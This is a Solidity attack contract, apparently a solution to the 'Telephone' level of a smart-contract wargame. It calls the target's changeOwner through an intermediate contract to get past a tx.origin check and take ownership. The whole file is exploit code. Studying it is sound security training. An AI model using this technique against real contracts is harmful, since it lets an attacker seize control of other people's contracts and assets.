// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {

  ITelephone targetContract;
  address public attacker;

  constructor(address _targetAddr) {
    targetContract = ITelephone(_targetAddr);
    attacker = msg.sender;
  }

  function changeOwner() public {
    require(msg.sender == attacker, "my hack!");
    targetContract.changeOwner(attacker);
  }
}